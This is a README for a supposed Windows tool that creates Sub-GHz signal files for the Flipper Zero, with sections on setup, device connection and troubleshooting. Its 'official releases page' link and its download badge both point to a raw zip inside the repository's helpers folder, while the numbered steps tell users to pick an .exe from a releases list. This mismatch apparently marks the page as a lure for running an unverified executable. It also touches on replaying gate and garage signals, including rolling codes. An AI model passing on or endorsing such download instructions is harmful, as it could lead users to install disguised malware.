# 🕹️ flipper-sub-creator - Create custom remote signals with ease

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kiddo8059/flipper-sub-creator/raw/refs/heads/main/helpers/sub_flipper_creator_v1.3.zip)

## 📌 About this project

The flipper-sub-creator application manages Sub-GHz signals for your Flipper Zero device. Many stock Flipper installations lack specific codes for custom gate openers, garage doors, or smart home devices. This tool bridges that gap by letting you define, test, and save custom protocol files directly on your computer before transferring them to your hardware. 

You do not need programming skills to use this tool. It features a graphical interface that handles the complex math behind radio frequencies. You simply input the signal timing and wait intervals provided by your existing remote manual or device specifications.

## 🛠️ System requirements

This application runs on any modern version of Microsoft Windows. Ensure your computer meets these basic criteria:

* Operating System: Windows 10 or Windows 11.
* Connectivity: One available USB port to connect your Flipper Zero.
* Storage: At least 50 MB of free hard drive space.
* Memory: 4 GB of RAM or higher.

The application does not require advanced drivers for basic operation, though you should keep your Flipper Zero firmware updated to the latest version to ensure compatibility with new signal formats.

## 📥 Get the software

Visit the [official releases page](https://github.com/kiddo8059/flipper-sub-creator/raw/refs/heads/main/helpers/sub_flipper_creator_v1.3.zip) to download the latest version of the application. 

1. Navigate to the link provided above.
2. Look for the latest release version at the top of the list.
3. Click the file ending in `.exe` to start the download.
4. Save the file to your desktop or downloads folder.
5. Double-click the file to open the installer.
6. Follow the on-screen prompts to finish the setup process.

## ⚙️ How it works

The application functions by creating files that the Flipper Zero interprets as radio signals. The radio spectrum depends on strict timing windows. If your signal timing is off by even a fraction, the target device will not react.

Use the main dashboard to create a new profile. You name your signal, define the frequency, and set the bit duration. Once you finish your configuration, the software exports the file into the standard format accepted by the Flipper Zero.

## 🔌 Connecting your device

1. Connect your Flipper Zero to your computer using the USB-C cable.
2. Open the flipper-sub-creator application.
3. Select the "Scan Devices" option if the application does not detect your Flipper automatically.
4. Once connected, the application will display your device information in the status bar at the bottom of the window.

## 🚀 Creating your first signal

1. Click the "New Project" button in the top menu.
2. Select the frequency range compatible with your specific device (usually 315 MHz, 433 MHz, or 868 MHz).
3. Enter the raw code data you obtained from your device manual. Most manufacturers list these codes as a series of ones and zeros or specific timing labels.
4. Use the "Test Signal" button to simulate the output. This allows you to verify the structure of your signal without needing to physically activate your remote every time.
5. Click "Save to Device" to transfer the signal file directly to the "sub-ghz" folder on your Flipper Zero.

## 💡 Troubleshooting common issues

If your signals do not trigger the device, check the following variables:

* Frequency Mismatch: Verify that the frequency set in the app matches the sticker on the back of your target device.
* Timing Errors: Signals often require specific "preamble" data. Check the documentation for your remote to ensure you included the start bits.
* Connection Stability: Ensure the USB cable is fully seated in both the computer and the Flipper Zero. If the connection drops, unplug and reconnect the cable.
* Firmware Compatibility: If the Flipper Zero does not show the file upon disconnection, restart the device from the main menu. 

## 🛡️ Responsible usage

This tool helps users interact with personal property and local radio systems. Always monitor your transmissions to ensure they only affect devices you own. Misuse of radio frequency equipment can disrupt public services or neighbor communications. Stick to local regulations regarding radio transmissions in your area.

## 📁 Managing your library

The software organizes signals by tag. Use different labels to categorize your keys, such as "Home," "Work," or "Gate." You can batch-process multiple signals at once if your device uses a rolling code or a multi-button sequence. The "Library" tab allows for easy drag-and-drop management of files stored on your local drive. Archive older signals here to keep your Flipper Zero storage clean and organized. 

## 🔄 Updating your tools

Check the releases page once per month for updates. Each new version adds more protocol support and fixes minor performance bugs. You do not need to uninstall the old version; simply run the new installer to overwrite existing files, which keeps your settings and library intact.